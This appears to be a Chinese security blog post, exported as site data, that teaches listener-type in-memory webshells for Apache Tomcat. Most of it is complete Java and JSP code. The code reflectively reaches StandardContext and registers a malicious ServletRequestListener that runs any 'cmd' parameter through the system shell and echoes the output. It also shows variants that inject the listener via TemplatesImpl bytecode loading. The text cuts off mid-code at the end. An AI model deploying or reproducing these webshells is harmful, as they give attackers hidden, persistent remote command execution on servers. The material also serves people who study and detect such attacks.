java.util.Arrays;\nimport javax.servlet.ServletContext;\nimport javax.servlet.ServletRequest;\nimport javax.servlet.ServletRequestEvent;\nimport javax.servlet.ServletRequestListener;\nimport java.lang.reflect.Field;\nimport java.util.List;\n\npublic class ListenerInject extends AbstractTranslet implements ServletRequestListener {\n    static {\n        //获取request和response\n        try {\n            Field context= null;\n            context = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\").getDeclaredField(\"lastServicedRequest\");\n            context.setAccessible(true);\n            ThreadLocal threadLocal=(ThreadLocal) context.get(null);\n            ServletRequest request=null;\n            if(threadLocal!=null&&threadLocal.get()!=null){\n                request= (ServletRequest) threadLocal.get();\n            }\n\n            if(request!=null){\n                //获取context\n                ServletContext servletContext=request.getServletContext();\n                if(servletContext!=null){\n                    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n                    appctx.setAccessible(true);\n                    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n                    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n                    stdctx.setAccessible(true);\n                    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n                    //注入listener\n                    Object[] objects = standardContext.getApplicationEventListeners();\n                    List<Object> listeners = Arrays.asList(objects);\n                    List<Object> listenerList = new ArrayList(listeners);\n                    listenerList.add(new ListenerInject());\n                    standardContext.setApplicationEventListeners(listenerList.toArray());\n                }\n            }\n        } catch (NoSuchFieldException e) {\n            e.printStackTrace();\n        } catch (ClassNotFoundException e) {\n            e.printStackTrace();\n        } catch (IllegalAccessException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {\n\n    }\n\n    @Override\n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {\n\n    }\n\n    @Override\n    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n    }\n\n    @Override\n    public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n        try {\n            Field requestf=test.getClass().getDeclaredField(\"request\");\n            requestf.setAccessible(true);\n            Request request= (Request) requestf.get(test);\n            Response response=request.getResponse();\n\n            String cmd=request.getParameter(\"cmd\");\n            System.out.println(cmd);\n            if(cmd!=null){\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n\n                response.getWriter().write(new String(baos.toByteArray()));\n            }\n        } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n\n\n成功注入，over\n\n### 另一种动态注入listener的方式\n\n我发现有一个`addApplicationEventListener` 方法，可以直接将对象插进去\n\n\n\n```auto\nstandardContext.addApplicationEventListener(new Testlistener());\n```\n\n所以我们的jsp马就可以简化成\n\n```auto\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.List\" %>\n<%@ page import=\"java.util.Arrays\" %>\n<%@ page import=\"java.util.ArrayList\" %>\n<%@ page import=\"org.apache.catalina.connector.RequestFacade\" %>\n<%@ page import=\"org.apache.catalina.connector.Request\" %>\n<%@ page import=\"org.apache.catalina.connector.Response\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n\n<%\n    class Testlistener implements ServletRequestListener {\n        @Override\n        public void requestDestroyed(ServletRequestEvent servletRequestEvent) {\n\n        }\n\n        @Override\n        public void requestInitialized(ServletRequestEvent servletRequestEvent) {\n            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();\n            try {\n                Field requestf=test.getClass().getDeclaredField(\"request\");\n                requestf.setAccessible(true);\n                Request request= (Request) requestf.get(test);\n                Response response=request.getResponse();\n\n                String cmd=request.getParameter(\"cmd\");\n                System.out.println(cmd);\n                if(cmd!=null){\n                    InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+cmd).getInputStream();\n                    ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                    byte[] b = new byte[1024];\n                    int a = -1;\n\n                    while ((a = in.read(b)) != -1) {\n                        baos.write(b, 0, a);\n                    }\n\n                    response.getWriter().write(new String(baos.toByteArray()));\n                }\n            } catch (NoSuchFieldException | IllegalAccessException | IOException e) {\n                e.printStackTrace();\n            }\n\n        }\n    }\n%>\n\n<%\n    //获取StandardContext\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //注入listener\n    standardContext.addApplicationEventListener(new Testlistener());\n%>\n```\n\n","slug":"Tomcat内存马—Listener型","published":1,"updated":"2024-04-17T08:43:00.811Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7iw000gh7769sksbi80","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>之前学了 filter 型的内存马，现在继续学习 listener 型</p>\n<h2 id=\"正文\"><a href=\"#正文\" class=\"headerlink\" title=\"正文\"></a>正文</h2><p>前面的 <code>filter</code> 内存马是通过动态注册恶意的 <code>filter</code> 来实现一个 <code>webshell</code> ，这个 <code>listener</code> 内存马原理其实也差不多，就是动态注册一个恶意的 <code>listener</code> 。</p>\n<h3 id=\"构造恶意Listener\"><a href=\"#构造恶意Listener\" class=\"headerlink\" title=\"构造恶意Listener\"></a>构造恶意Listener</h3><p>这个恶意的 <code>Listener</code> 要实现一个webshell的功能，就需要获取到 <code>request</code> 对象，现在来看一下怎么构造出这个恶意 <code>Listener</code></p>\n<p><code>requestInitialized</code> 方法只有一个<code>ServletRequestEvent</code> 类型的参数，也就是servlet请求事件。那么就需要想办法从这个 <code>ServletRequestEvent</code> 对象中来获取 <code>request</code> 对象。</p>\n<p>可以看到该对象有一个 <code>getServletRequest</code> 方法，看起来就跟 <code>request</code> 对象有关</p>\n<p>可以看到返回了一个 <code>ServletRequest</code> 接口的实现类的对象，测试一下看看具体返回的哪个类的对象</p>\n<p>可以看到是 <code>org.apache.catalina.connector.RequestFacade</code> 的对象，看看他有哪些属性</p>\n<p>发现其有 <code>request</code> 属性是 <code>Request</code> 类型的，那么我们就可以通过反射来获取该属性的值</p>\n<p>开始构造恶意 <code>Listener</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import org.apache.catalina.connector.Request;</span><br><span class=\"line\">import org.apache.catalina.connector.RequestFacade;</span><br><span class=\"line\">import org.apache.catalina.connector.Response;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.servlet.Filter;</span><br><span class=\"line\">import javax.servlet.ServletRequest;</span><br><span class=\"line\">import javax.servlet.ServletRequestEvent;</span><br><span class=\"line\">import javax.servlet.ServletRequestListener;</span><br><span class=\"line\">import java.io.ByteArrayOutputStream;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.io.InputStream;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Testlistener implements ServletRequestListener &#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">        RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">            requestf.setAccessible(true);</span><br><span class=\"line\">            Request request= (Request) requestf.get(test);</span><br><span class=\"line\">            Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">            String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">            if(cmd!=null)&#123;</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>成功</p>\n<h3 id=\"实现动态注册Listener\"><a href=\"#实现动态注册Listener\" class=\"headerlink\" title=\"实现动态注册Listener\"></a>实现动态注册Listener</h3><p>现在来理一下 <code>Listener</code> 的注册流程</p>\n<p>先下两个断点，第一个断点是为了查看什么时候进行的实例化，第二个断点是要知道什么时候调用的该方法。</p>\n<p>在 <code>StandardContext$listenerStart</code>进行实例化，我们跟踪一下 <code>listeners</code> 的来源</p>\n<p><code>listeners</code> 是一个 <code>String</code> 类型的数组，存储了 <code>listener</code> 的名字,通过 <code>findApplicationListeners</code> 方法获取值</p>\n<p><code>results</code> 数组用来存储已经实例化的 <code>listener</code> 对象，然后继续看</p>\n<p>将 <code>results</code> 中的 <code>listener</code> 分类存放，我们的 <code>TestListener</code> 就被分到了 <code>eventListeners</code> 中</p>\n<p>然后调用 <code>getApplicationEventListeners</code> 获取 <code>applicationEventListenersList</code> ，就是已注册的 <code>applicationEventListener</code> ，并将其添加到我们的 <code>eventListeners</code> 中。之后再调用 <code>setApplicationEventListeners</code> 将<code>eventListeners</code> 设置为<code>ApplicationEventListeners</code> 。刚看到时我在想，为什么要将已有的<code>applicationEventListener</code> 取出来，然后再 <code>set</code> 呢，这不会重复吗，随后跟进一下 <code>setApplicationEventListeners</code> 方法的源码就知道了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void setApplicationEventListeners(Object[] listeners) &#123;</span><br><span class=\"line\">        this.applicationEventListenersList.clear();</span><br><span class=\"line\">        if (listeners != null &amp;&amp; listeners.length &gt; 0) &#123;</span><br><span class=\"line\">            this.applicationEventListenersList.addAll(Arrays.asList(listeners));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>该方法首先会清空 <code>applicationEventListenersList</code> ，然后再进行添加。</p>\n<p>然后 <code>instance</code> 这个数组就会获取所有已注册的 <code>lsitener</code> ，且是已实例化的 <code>listener</code> ，然后就是一些其他的处理了，这里不再关注。</p>\n<p>继续看第二个断点</p>\n<p>可以看到对 <code>requestInitialized</code> 方法的调用是在 <code>StandardContext$fireRequestInitEvent</code> 中进行的，这个 <code>listener</code> 是从 <code>instances</code> 数组中得到的，而<code>instances</code> 又是调用<code>getApplicationEventListeners</code> 方法获取的</p>\n<p>那么其实我们如果将恶意 <code>listener</code> 添加到这个 list中就可以了，就像这样</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class=\"line\">List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class=\"line\">List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class=\"line\">listenerList.add(new Testlistener());</span><br><span class=\"line\">standardContext.setApplicationEventListeners(listenerList.toArray());</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"JSP实现内存马注入\"><a href=\"#JSP实现内存马注入\" class=\"headerlink\" title=\"JSP实现内存马注入\"></a>JSP实现内存马注入</h3><p>先使用 <code>JSP</code> 实现内存马的注入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.List&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.Arrays&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.ArrayList&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.RequestFacade&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.connector.Response&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    class Testlistener implements ServletRequestListener &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;</span><br><span class=\"line\">            RequestFacade test= (RequestFacade) servletRequestEvent.getServletRequest();</span><br><span class=\"line\">            try &#123;</span><br><span class=\"line\">                Field requestf=test.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class=\"line\">                requestf.setAccessible(true);</span><br><span class=\"line\">                Request request= (Request) requestf.get(test);</span><br><span class=\"line\">                Response response=request.getResponse();</span><br><span class=\"line\"></span><br><span class=\"line\">                String cmd=request.getParameter(&quot;cmd&quot;);</span><br><span class=\"line\">                System.out.println(cmd);</span><br><span class=\"line\">                if(cmd!=null)&#123;</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+cmd).getInputStream();</span><br><span class=\"line\">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                    byte[] b = new byte[1024];</span><br><span class=\"line\">                    int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                        baos.write(b, 0, a);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                    response.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; catch (NoSuchFieldException | IllegalAccessException | IOException e) &#123;</span><br><span class=\"line\">                e.printStackTrace();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    //获取StandardContext</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\">    </span><br><span class=\"line\">    //注入listener</span><br><span class=\"line\">    Object[] objects = standardContext.getApplicationEventListeners();</span><br><span class=\"line\">    List&lt;Object&gt; listeners = Arrays.asList(objects);</span><br><span class=\"line\">    List&lt;Object&gt; listenerList = new ArrayList(listeners);</span><br><span class=\"line\">    listenerList.add(new Testlistener());</span><br><span class=\"line\">    standardContext.setApplicationEventListeners(listenerList.toArray());</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>可以执行命令并获取回显</p>\n<h3 id=\"动态加载字节码实现内存马注入\"><a href=\"#动态加载字节码实现内存马注入\" class=\"headerlink\" title=\"动态加载字节码实现内存马注入\"></a>动态加载字节码实现内存马注入</h3><p>用反序列化有点麻烦，通常我们反序列化注入内存马也是用加载字节码的方式，所以我这里直接加载字节码方便一点，原理一样的。</p>\n<p>测试demo</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"></span><br><span class=\"line\">import javax.servlet.ServletException;</span><br><span class=\"line\">import javax.servlet.http.HttpServlet;</span><br><span class=\"line\">import javax.servlet.http.HttpServletRequest;</span><br><span class=\"line\">import javax.servlet.http.HttpServletResponse;</span><br><span class=\"line\">import javax.xml.transform.TransformerConfigurationException;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\">import java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\">public class ListenerShell extends HttpServlet&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">        String test=req.getParameter(&quot;test&quot;);</span><br><span class=\"line\">        byte[] bytecode= Base64.getDecoder().decode(test);</span><br><span class=\"line\">        byte[][] bytee= new byte[][]&#123;bytecode&#125;;</span><br><span class=\"line\">        TemplatesImpl templates=new TemplatesImpl();</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            setFildValue(templates,&quot;_bytecodes&quot;,bytee);</span><br><span class=\"line\">            setFildValue(templates,&quot;_name&quot;,&quot;Code&quot;);</span><br><span class=\"line\">            setFildValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl());</span><br><span class=\"line\">            templates.newTransformer();</span><br><span class=\"line\">        &#125; catch (TransformerConfigurationException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (NoSuchFieldException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;</span><br><span class=\"line\">        super.doGet(req, resp);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void setFildValue(Object obj,String name,Object value) throws NoSuchFieldException, IllegalAccessException &#123;</span><br><span class=\"line\">        Field field=obj.getClass().getDeclaredField(name);</span><br><span class=\"line\">        field.setAccessible(true);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>就是利用 <code>TemplatesImpl</code> 加载字节码，试一下</p>\n<p>现在来编写POC，这里我们还是用之前学的 <code>lastServicedRequest</code> 的方式获取回显，过程还是分为两不</p>\n<ul>\n<li>将 <code>request</code> 和 <code>response</code> 对象分别存放进<code>lastServicedRequest</code> 和 <code>lastServicedResponse</code> 对象</li>\n<li>将 <code>request</code> 从 <code>lastServicedRequest</code>取出，并通过其动态注册恶意 listener</li>\n</ul>\n<p>第一步可以直接用之前的代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class=\"line\">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class=\"line\">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Echoinject extends AbstractTranslet &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            //修改WRAP_SAME_OBJECT的值为true</span><br><span class=\"line\">            Class dispatcher = Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;);</span><br><span class=\"line\">            Field WRAP_SAME_OBJECT = dispatcher.getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);</span><br><span class=\"line\">            WRAP_SAME_OBJECT.setAccessible(true);</span><br><span class=\"line\"></span><br><span class=\"line\">            //修改final变量，否则不能修改final的属性</span><br><span class=\"line\">            Field modifiersField = WRAP_SAME_OBJECT.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class=\"line\">            modifiersField.setAccessible(true);</span><br><span class=\"line\">            modifiersField.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class=\"line\">            if (!WRAP_SAME_OBJECT.getBoolean(null)) &#123;</span><br><span class=\"line\">                WRAP_SAME_OBJECT.setBoolean(null, true);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            //初始化lastServicedRequest</span><br><span class=\"line\">            Class filterchain = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterChain&quot;);</span><br><span class=\"line\">            Field lastServicedRequest = filterchain.getDeclaredField(&quot;lastServicedRequest&quot;);</span><br><span class=\"line\">            modifiersField = lastServicedRequest.getClass().getDeclaredField(&quot;modifiers&quot;);</span><br><span class=\"line\">            